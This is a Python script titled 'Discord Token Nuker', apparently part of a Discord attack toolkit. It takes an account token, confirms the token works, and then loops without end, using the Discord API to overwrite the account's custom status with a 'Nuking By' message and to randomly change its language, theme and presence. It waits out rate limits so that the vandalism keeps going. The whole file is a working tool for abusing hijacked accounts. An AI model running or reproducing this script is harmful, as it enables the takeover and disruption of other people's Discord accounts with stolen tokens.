import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config.util import *
from config.config import *

import requests
import random
import time
from itertools import cycle

Title("Discord Token Nuker")

LOCALES = [
    "bg", "cs", "da", "de", "el", "en-GB", "es-419", "es-ES", "fi", "fr",
    "hi", "hr", "hu", "it", "ja", "ko", "lt", "nl", "no", "pl", "pt-BR",
    "ro", "ru", "sv-SE", "th", "tr", "uk", "vi", "zh-CN", "zh-TW"
]

PRESENCES = ["online", "idle", "dnd"]
THEMES = cycle(["dark", "light", "darker"])

raw_token = input(f"{color.BLUE}\n{INPUT} Token -> {color.RESET}")
token = CleanToken(raw_token)

if not token:
    print(f"\n{color.blue}{ERROR} Token is empty.{color.RESET}")
    Continue()
    Reset()

if token.count(".") != 2:
    print(f"\n{color.blue}{ERROR} Malformed token: expected 3 dot-separated segments.{color.RESET}")
    Continue()
    Reset()

if not TOKEN_REGEX.match(token):
    print(f"\n{color.blue}{ERROR} Malformed token: segment lengths look wrong.{color.RESET}")
    Continue()
    Reset()

session = requests.Session()
session.headers.update(DiscordHeaders(token))


def request(method, endpoint, payload=None):
    while True:
        try:
            r = session.request(method, f"{DISCORD_API}{endpoint}", json=payload, timeout=15)
        except requests.RequestException:
            return None

        if r.status_code == 429:
            try:
                delay = float(r.json().get("retry_after", 1))
            except Exception:
                delay = float(r.headers.get("Retry-After", 1))
            time.sleep(min(delay, 30) + 0.15)
            continue

        return r


def log(icon, label, value):
    print(f"{blue}[{white}{current_time_hour()}{blue}] {icon} {label}: {color.WHITE}{value}{color.BLUE}")


def apply(endpoint, payload, label, value):
    try:
        r = request("PATCH", endpoint, payload)
        if r is not None and r.status_code in (200, 204):
            log(ADD, label, value)
        else:
            log(ERROR, label, value)
    except Exception:
        log(ERROR, label, value)


r = request("GET", "/users/@me")

if r is None:
    print(f"\n{color.blue}{ERROR} Could not reach Discord, check your connection.{color.RESET}")
    Continue()
    Reset()

if r.status_code == 401:
    print(f"\n{color.blue}{ERROR} Token is invalid or expired.{color.RESET}")
    Continue()
    Reset()

if r.status_code == 403:
    print(f"\n{color.blue}{ERROR} Token is locked or requires verification.{color.RESET}")
    Continue()
    Reset()

if r.status_code != 200:
    print(f"\n{color.blue}{ERROR} Unexpected response from Discord (HTTP {r.status_code}).{color.RESET}")
    Continue()
    Reset()

try:
    account = r.json()
except Exception:
    account = {}

account_name = account.get("global_name") or account.get("username") or "unknown"
print(f"{color.blue}{INFO} Account: {color.WHITE}{account_name}{color.BLUE} | ID: {color.WHITE}{account.get('id', '?')}{color.RESET}")

default_status = f"Nuking By {github_tool}"
custom_status = input(f"{color.BLUE}{INPUT} Enter Custom Status -> {color.RESET}").strip()

if custom_status:
    custom_status = f"{custom_status} | {name_tool}"
else:
    custom_status = f"{name_tool} | {creator}"
    print(f"{color.blue}{INFO} Empty input, using default: {color.WHITE}{custom_status}{color.RESET}")

while True:

    for text in (default_status, custom_status):

        apply(
            "/users/@me/settings",
            {"custom_status": {"text": text, "emoji_id": None, "emoji_name": None, "expires_at": None}},
            "Status Discord",
            text
        )

        for _ in range(5):

            locale = random.choice(LOCALES)
            apply("/users/@me/settings", {"locale": locale}, "Language", locale)

            theme = next(THEMES)
            apply("/users/@me/settings", {"theme": theme}, "Theme", theme)

            presence = random.choice(PRESENCES)
            apply("/users/@me/settings", {"status": presence}, "Presence", presence)

            time.sleep(0.35)